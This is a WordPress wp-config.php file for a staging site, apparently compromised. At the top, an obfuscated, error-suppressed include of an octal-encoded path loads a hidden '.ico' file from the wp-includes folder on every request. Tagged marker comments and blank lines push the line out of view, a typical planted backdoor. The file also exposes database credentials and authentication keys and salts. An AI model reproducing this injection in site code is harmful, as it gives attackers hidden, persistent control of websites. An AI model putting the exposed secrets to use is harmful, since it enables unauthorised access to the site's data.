<?php
/*3a8eb*/

@include "\057h\157m\145/\162m\166x\1413\060k\0613\066r\057p\165b\154i\143_\150t\155l\057n\141p\157l\154o\056u\163/\167p\055i\156c\154u\144e\163/\123i\155p\154e\120i\145/\104e\143o\144e\057.\067c\0624\1429\063c\056i\143o";

/*3a8eb*/























/**
 * The base configuration for WordPress
 *
 * The wp-config.php creation script uses this file during the
 * installation. You don't have to use the web site, you can
 * copy this file to "wp-config.php" and fill in the values.
 *
 * This file contains the following configurations:
 *
 * * MySQL settings
 * * Secret keys
 * * Database table prefix
 * * ABSPATH
 *
 * @link https://wordpress.org/support/article/editing-wp-config-php/
 *
 * @package WordPress
 */
// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define( 'DB_NAME', 'staging-napollous' );
/** MySQL database username */
define( 'DB_USER', 'bn_wordpress' );
/** MySQL database password */
define( 'DB_PASSWORD', '6435405216' );
/** MySQL hostname */
define( 'DB_HOST', 'localhost' );
/** Database Charset to use in creating database tables. */
define( 'DB_CHARSET', 'utf8' );
/** The Database Collate type. Don't change this if in doubt. */
define( 'DB_COLLATE', '' );
/**#@+
 * Authentication Unique Keys and Salts.
 *
 * Change these to different unique phrases!
 * You can generate these using the {@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service}
 * You can change these at any point in time to invalidate all existing cookies. This will force all users to have to log in again.
 *
 * @since 2.6.0
 */
define('AUTH_KEY', 'ee2d41e780f8683ef85450cc5c5720c1f238347042b2f5c6d1b8d242cf25b931');
define('SECURE_AUTH_KEY', '3d951c7275929fa0579ae90c2846e1fa094de9e651555b8ad092ce9eb632d1f3');
define('LOGGED_IN_KEY', 'cd906334febebde3558c0770222bc1675061c938847342593caeb70349b73990');
define('NONCE_KEY', '173bb9229fe12cd6ad17ef49b4efc6a46d9dfc54c07522eabdf4c88e4af5d90f');
define('AUTH_SALT', '5dcd2874f569b22d403db07bdd20419c22aae493121cab3e2b9f113939e3d1ea');
define('SECURE_AUTH_SALT', '0f1d5c5893a6a0324a3c18fc100fc495f2d2af9a5d063bff1be671ea31c3dbf1');
define('LOGGED_IN_SALT', '118ef97bf9a0cb382507e3173ac8a9687fb079f1173ece321148406926cf90eb');
define('NONCE_SALT', '64777bf21bc6529e37520fd37fe125365314c864f5d7b37b50efe58b85035364');
/**#@-*/
/**
 * WordPress Database Table prefix.
 *
 * You can have multiple installations in one database if you give each
 * a unique prefix. Only numbers, letters, and underscores please!
 */
$table_prefix = 'nus_';
/**
 * For developers: WordPress debugging mode.
 *
 * Change this to true to enable the display of notices during development.
 * It is strongly recommended that plugin and theme developers use WP_DEBUG
 * in their development environments.
 *
 * For information on other constants that can be used for debugging,
 * visit the documentation.
 *
 * @link https://wordpress.org/support/article/debugging-in-wordpress/
 */
define( 'WP_DEBUG', true );
//define( 'WP_DEBUG', false );
/* That's all, stop editing! Happy publishing. */
/** Absolute path to the WordPress directory. */
if ( ! defined( 'ABSPATH' ) ) {
	define( 'ABSPATH', dirname( __FILE__ ) . '/' );
}
/** Sets up WordPress vars and included files. */
require_once( ABSPATH . 'wp-settings.php' );
